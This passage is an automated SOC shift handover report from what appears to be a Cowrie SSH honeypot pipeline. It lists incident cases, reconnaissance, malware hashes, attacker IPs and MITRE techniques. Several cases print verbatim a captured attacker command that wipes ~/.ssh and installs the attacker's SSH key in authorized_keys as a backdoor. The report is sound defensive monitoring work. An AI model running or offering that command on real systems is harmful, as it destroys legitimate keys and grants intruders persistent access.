**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb6ac8d3acb0

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:47 |
| **Last Seen** | 2026-05-04 16:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:47:26` | `cowrie.session.connect` |
| `2026-05-04 16:47:26` | `cowrie.client.version` |
| `2026-05-04 16:47:26` | `cowrie.client.kex` |
| `2026-05-04 16:47:27` | `cowrie.login.success` |
| `2026-05-04 16:47:27` | `cowrie.session.params` |
| `2026-05-04 16:47:27` | `cowrie.command.input` |
| `2026-05-04 16:47:27` | `cowrie.command.failed` |
| `2026-05-04 16:47:27` | `cowrie.log.closed` |
| `2026-05-04 16:47:27` | `cowrie.session.params` |
| `2026-05-04 16:47:27` | `cowrie.command.input` |
| `2026-05-04 16:47:27` | `cowrie.session.file_download` |
| `2026-05-04 16:47:27` | `cowrie.log.closed` |
| `2026-05-04 16:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b974351ffdbe

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:47 |
| **Last Seen** | 2026-05-04 16:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:47:30` | `cowrie.session.connect` |
| `2026-05-04 16:47:30` | `cowrie.client.version` |
| `2026-05-04 16:47:30` | `cowrie.client.kex` |
| `2026-05-04 16:47:30` | `cowrie.login.success` |
| `2026-05-04 16:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a380f4a9c3b0

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:52 |
| **Last Seen** | 2026-05-04 16:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:52:09` | `cowrie.session.connect` |
| `2026-05-04 16:52:10` | `cowrie.client.version` |
| `2026-05-04 16:52:10` | `cowrie.client.kex` |
| `2026-05-04 16:52:10` | `cowrie.login.success` |
| `2026-05-04 16:52:11` | `cowrie.session.params` |
| `2026-05-04 16:52:11` | `cowrie.command.input` |
| `2026-05-04 16:52:11` | `cowrie.command.failed` |
| `2026-05-04 16:52:11` | `cowrie.log.closed` |
| `2026-05-04 16:52:11` | `cowrie.session.params` |
| `2026-05-04 16:52:11` | `cowrie.command.input` |
| `2026-05-04 16:52:11` | `cowrie.session.file_download` |
| `2026-05-04 16:52:11` | `cowrie.log.closed` |
| `2026-05-04 16:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd5c782ac905

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:52 |
| **Last Seen** | 2026-05-04 16:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:52:13` | `cowrie.session.connect` |
| `2026-05-04 16:52:13` | `cowrie.client.version` |
| `2026-05-04 16:52:13` | `cowrie.client.kex` |
| `2026-05-04 16:52:14` | `cowrie.login.success` |
| `2026-05-04 16:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd99b32430ec

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:56 |
| **Last Seen** | 2026-05-04 16:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:56:52` | `cowrie.session.connect` |
| `2026-05-04 16:56:52` | `cowrie.client.version` |
| `2026-05-04 16:56:52` | `cowrie.client.kex` |
| `2026-05-04 16:56:53` | `cowrie.login.success` |
| `2026-05-04 16:56:53` | `cowrie.session.params` |
| `2026-05-04 16:56:53` | `cowrie.command.input` |
| `2026-05-04 16:56:53` | `cowrie.command.failed` |
| `2026-05-04 16:56:53` | `cowrie.log.closed` |
| `2026-05-04 16:56:54` | `cowrie.session.params` |
| `2026-05-04 16:56:54` | `cowrie.command.input` |
| `2026-05-04 16:56:54` | `cowrie.session.file_download` |
| `2026-05-04 16:56:54` | `cowrie.log.closed` |
| `2026-05-04 16:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f033df2b47f

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:56 |
| **Last Seen** | 2026-05-04 16:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:56:56` | `cowrie.session.connect` |
| `2026-05-04 16:56:56` | `cowrie.client.version` |
| `2026-05-04 16:56:56` | `cowrie.client.kex` |
| `2026-05-04 16:56:57` | `cowrie.login.success` |
| `2026-05-04 16:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b91cf948704d

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 17:01 |
| **Last Seen** | 2026-05-04 17:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 17:01:37` | `cowrie.session.connect` |
| `2026-05-04 17:01:37` | `cowrie.client.version` |
| `2026-05-04 17:01:37` | `cowrie.client.kex` |
| `2026-05-04 17:01:37` | `cowrie.login.success` |
| `2026-05-04 17:01:38` | `cowrie.session.params` |
| `2026-05-04 17:01:38` | `cowrie.command.input` |
| `2026-05-04 17:01:38` | `cowrie.command.failed` |
| `2026-05-04 17:01:38` | `cowrie.log.closed` |
| `2026-05-04 17:01:38` | `cowrie.session.params` |
| `2026-05-04 17:01:38` | `cowrie.command.input` |
| `2026-05-04 17:01:38` | `cowrie.session.file_download` |
| `2026-05-04 17:01:38` | `cowrie.log.closed` |
| `2026-05-04 17:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc45c79c25a7

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 17:01 |
| **Last Seen** | 2026-05-04 17:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 17:01:41` | `cowrie.session.connect` |
| `2026-05-04 17:01:41` | `cowrie.client.version` |
| `2026-05-04 17:01:41` | `cowrie.client.kex` |
| `2026-05-04 17:01:41` | `cowrie.login.success` |
| `2026-05-04 17:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `174.127.79[.]35` | **252** | 2026-05-04 15:50 | 2026-05-04 17:06 | 144m | 0 | `T1592` | 🟠 MEDIUM |
| `193.93.249[.]93` | **90** | 2026-05-04 14:37 | 2026-05-04 14:50 | 48m | 0 | `T1592` | 🟠 MEDIUM |
| `102.213.34[.]99` | **30** | 2026-05-04 15:57 | 2026-05-04 16:42 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]80` | **30** | 2026-05-04 15:34 | 2026-05-04 16:05 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.168.135[.]187` | **30** | 2026-05-04 15:52 | 2026-05-04 16:17 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `222.110.147[.]56` | **30** | 2026-05-04 14:48 | 2026-05-04 17:06 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.244.172[.]204` | **25** | 2026-05-04 15:36 | 2026-05-04 15:41 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `161.132.52[.]19` | **6** | 2026-05-04 14:10 | 2026-05-04 16:14 | 3m | 0 | `T1592` | 🟢 LOW |
| `8.209.237[.]154` | **4** | 2026-05-04 14:26 | 2026-05-04 14:27 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `183.56.235[.]140` | **3** | 2026-05-04 17:18 | 2026-05-04 17:33 | 3m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.194[.]88` | **2** | 2026-05-04 14:59 | 2026-05-04 14:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]225` | 1 | 2026-05-04 15:39 | 2026-05-04 15:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.145.237[.]236` | 1 | 2026-05-04 15:32 | 2026-05-04 15:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.39.93[.]73` | 1 | 2026-05-04 15:35 | 2026-05-04 15:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.36.38[.]211` | 1 | 2026-05-04 15:48 | 2026-05-04 15:48 | 13s | 0 | `T1592` | 🟢 LOW |
| `194.88.204[.]44` | 1 | 2026-05-04 17:08 | 2026-05-04 17:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `27.110.166[.]67` | 1 | 2026-05-04 14:57 | 2026-05-04 14:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]73` | 1 | 2026-05-04 14:44 | 2026-05-04 14:45 | 15s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]215` | 1 | 2026-05-04 14:29 | 2026-05-04 14:29 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `8.209.237[.]154` | JP | Shiodome Sumitomo Blog 1-9-2 TOKYO | **100** ⚠️ | 25 |
| `161.132.52[.]19` | PE | Red Cientifica Peruana | **100** ⚠️ | 0 |
| `183.56.235[.]140` | CN | CHINANET Guangdong province network | **100** ⚠️ | 43 |
| `174.127.79[.]35` | US | Hosting Services, Inc. | **100** ⚠️ | 0 |
| `102.88.137[.]80` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `222.110.147[.]56` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `194.88.204[.]44` | RU | OOO MIGRAPH | **100** ⚠️ | 11 |
| `104.152.52[.]225` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |
| `118.145.237[.]236` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 8 |
| `14.36.38[.]211` | KR | Korea Telecom | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 236 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 125 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 104 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 52 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 52 |

---

## 🔕 False Positive Summary (77 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 21 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 23 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 691 cases |
| Tool 34  | Credential Extractor        | ✅ 230 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 43 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 77 filtered (11.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 38 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 104 priority case(s) shown individually · 19 recon entry/entries in table (11 group(s) consolidating 502 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-04T17:45:05Z_
